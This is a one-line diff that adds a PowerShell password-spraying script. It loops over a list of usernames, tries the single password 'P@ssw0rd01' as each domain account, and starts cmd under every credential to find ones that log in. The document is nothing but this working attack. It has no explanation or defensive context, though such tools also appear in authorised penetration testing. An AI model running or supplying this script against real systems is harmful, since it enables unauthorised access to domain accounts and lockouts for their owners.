@@ -1,0 +1,1 @@
+$list | % {Write-Host Spraying : -NoNewline; Write-host -ForegroundColor Green " $_";$credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("domain\$_",(ConvertTo-SecureString -String 'P@ssw0rd01' -AsPlainText -Force));Start-Process cmd -Credential ($credentials)}
